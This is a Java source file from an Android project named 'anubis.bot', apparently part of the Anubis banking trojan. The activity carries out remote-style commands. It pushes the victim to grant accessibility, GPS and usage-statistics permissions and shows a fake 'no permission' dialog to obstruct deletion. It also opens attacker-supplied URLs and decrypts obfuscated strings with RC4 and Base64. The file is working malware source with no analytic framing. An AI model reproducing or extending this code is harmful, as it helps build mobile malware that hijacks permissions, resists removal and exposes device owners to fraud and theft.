package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;

public class ActivityAlert2 extends Activity {

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_usage_access_settings);
        UtilsClass SF = new UtilsClass();

        Intent intent = getIntent();
        String str = intent.getStringExtra("start");

        if(str.contains("statistic")){
            SF.startAlert(this,"statistic");
        }else if(str.contains("gps")){
            SF.startAlert(this,"gps");
        }else if(str.contains("deleteApp")){
            Intent appSettingsIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
            startActivity(appSettingsIntent);
        }else if(str.contains("accessibility")) {
            try {
                SF.startAlert(this, "accessibility");
             //   finish();
            } catch (Exception ex) {
              //  finish();
            }
        }else if(str.contains("blockDelete")){

            try{
                AlertDialog.Builder builder = new AlertDialog.Builder(this);

            builder.setTitle("Sorry!")
                    .setMessage("You have no permission to use this app!")
                    .setIcon(R.drawable.im)
                    .setCancelable(false)
                    .setNegativeButton("ОК",
                            new DialogInterface.OnClickListener() {

                                public void onClick(DialogInterface dialog, int id) {
                                finish();
                                }
                            });


                AlertDialog alert = builder.create();
                alert.show();}catch (Exception ex){}
        }else if(str.contains("**startbrurl**")){
            try {
                String url = str.replace("**startbrurl**", "");
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                startActivity(browserIntent);
             //   finish();
            }catch (Exception ex){
              //  finish();
            }
        }
    }
}
